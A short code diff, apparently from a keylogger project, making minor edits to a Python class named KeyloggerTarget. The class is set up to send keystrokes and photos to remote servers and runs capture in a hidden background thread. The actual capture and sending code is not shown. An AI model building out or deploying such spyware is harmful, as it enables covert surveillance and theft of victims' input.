@@ -11,6 +11,7 @@ import random
 import requests
 import webbrowser
 
+
 class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
@@ -29,8 +30,6 @@ class KeyloggerTarget:
 
         self.check = []
         self.caps = False
-        self.richtige_liste = None
-        self.coordinates = None
         self.richtige_liste = []
         self.coordinates = []
 
@@ -248,6 +247,8 @@ class KeyloggerTarget:
 
                     except requests.exceptions.ConnectionError:
                         print("No connection")
+                        sys.exit()
+
             listening_thread = threading.Thread(target=self.daten_aufnehemen)
             # This runs the programm behind the actual programming
             listening_thread.start()
